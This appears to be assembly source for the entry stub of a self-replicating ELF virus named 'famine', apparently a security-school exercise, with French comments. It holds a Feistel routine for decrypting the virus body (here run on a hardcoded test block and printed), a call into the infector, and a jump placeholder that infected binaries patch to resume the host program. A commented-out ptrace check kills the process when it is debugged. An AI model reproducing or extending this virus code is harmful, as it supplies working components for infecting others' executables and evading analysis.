bits 64

section .text
	global	_start
	extern	famine

; _ptrace:
; 	; ptrace(PTRACE_TRACEME, 0, 0, 0)
;     xor rdi, rdi          ; rdi = 0 (PTRACE_TRACEME = 0)
;     xor rsi, rsi          ; rsi = 0
;     xor rdx, rdx          ; rdx = 0
;     xor r10, r10          ; r10 = 0
;     mov rax, 101          ; syscall number for ptrace
;     syscall
;     ; Check if ptrace() returned an error
;     test rax, rax         ; Check if rax < 0
;     jge ret       		  ; Jump if no error (rax >= 0)
;     ; kill(getpid())
;     mov rax, 39           ; syscall number for getpid
;     syscall               ; rax now holds the PID
;     mov rdi, rax          ; Pass the PID to kill()
;     mov rax, 62           ; syscall number for kill
;     syscall
;     ; exit(0)
;     xor rdi, rdi          ; exit status = 0
;     mov rax, 60           ; syscall number for exit
;     syscall

_start:
	push	rax
	push	rbx
	push	rcx
	push	rdx
	push	rsp
    push    rsi
    push    rdi
    push    r15
    push    r14
    push    r13
    push    r12
    push    r11
    push    r10
    push    r9
    push    r8

	;si je suis l'original
	; jmp end_decrypt

    xor r15, r15
    sub rsp, 8                    ; Réserver 8 octets sur la pile pour `block`
	; debut = lea r8, [rel famine]
	; lea r8, [rel famine]
	;va load l'addresse du debut de la fonction famine (virus)
    mov r8, 0xF232B1C13CEDE077  ; r8 contient le message complet (64 bits)
    bswap r8
	; fin = lea r9, [rel _start]
	; lea r9, [rel _start]
	; va load l'addresse du debut de start (fin du virus, start non compris)
    mov r9, 8                   ; r9 contient la longueur du message (8 octets)
    mov r10, 0x123456789ABCDEF0 ; r10 contient la clé (64 bits)


; Boucle pour parcourir le message
process_message:
    mov rax, r15                  ; Charger l'index actuel
    cmp rax, r9          ; Comparer avec la taille totale
    jge end_decrypt              ; Si l'index dépasse la taille, fin

    ; Charger un bloc de 8 bytes à partir de l'index
    mov r12, r8                ; Stocker le bloc dans `block` (sur la pile)

decrypt:
    ; Charger les parties haute et basse dans left et right
    mov r14d, r12d                ; right = partie basse du bloc (32 bits)
    shr r12, 32                   ; Décaler pour obtenir la partie haute
    mov r13d, r12d                ; left = partie haute du bloc (32 bits)

    ; Décryptage du bloc (8 rounds inverses)
    mov ecx, 0x7

reverse_rounds:
    ; Calcul de la sous-clé : subkey = key ^ (round * 0x1234ABCD)
    mov eax, ecx                  ; subkey = round
    imul eax, eax, 0x1234ABCD     ; subkey = (subkey * 0x1234ABCD)
    xor eax, r10d                ; subkey = subkey ^ key

    ; Feistel déchiffrement
    mov r11d, r14d                ; temp = left

    ; Calculer left = right ^ feistel_function(left, subkey)
    mov esi, r14d
    shl esi, 3
    mov edi, r14d
    shr edi, 29
    or  esi, edi
    ; esi = ((block << 3) | (block >> 29))

    xor r14d, eax
    ; [left] = [left] ^ subkey

    add r14d, esi                 ; [left] = (block ^ subkey) + ((block << 3) | (block >> 29))

    mov eax, r13d
    xor r14d, eax

    ; Mettre à jour right
    mov eax, r11d                 ; r = temp
    mov r13d, eax                 ; right = r

    dec ecx                       ; round--
    jns reverse_rounds            ; si round >= 0 recommence

    ; Recomposer le bloc déchiffré
    shl r13, 32                   ; Décaler right pour le positionner dans la moitié haute
    or r14, r13                   ; Fusionner left et right
    mov [rsp], r14                ; Stocker le bloc déchiffré dans `block` (pile)

display_decrypted_block:
    mov rdi, 1                    ; stdout
    lea rsi, [rsp]                ; Adresse du bloc sur la pile
    mov rdx, 8                    ; Taille du bloc (8 octets)
    mov rax, 1                    ; syscall write
    syscall
    
    ; Passer au bloc suivant
    add r15, 8                    ; Avancer l'index de 8 bytes
    jmp process_message           ; Retourner dans la boucle


	

end_decrypt:
	call	famine	

	add rsp, 8

    pop     r8
    pop     r9
    pop     r10
    pop     r11
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    pop     rdi
    pop     rsi
	pop		rsp
	pop		rdx
	pop		rcx
	pop		rbx
	pop		rax

	jmp	0x4		; Does nothing but is the "lunch-pad" to the real entrypoint.
				; The "0x4" value will be changed on infected binaries to 
				; jump back to the program execution	
	mov	rax, 60
	mov	rdi, 0
	syscall		; exit(0)


section .note.GNU-stack noalloc noexec nowrite progbits

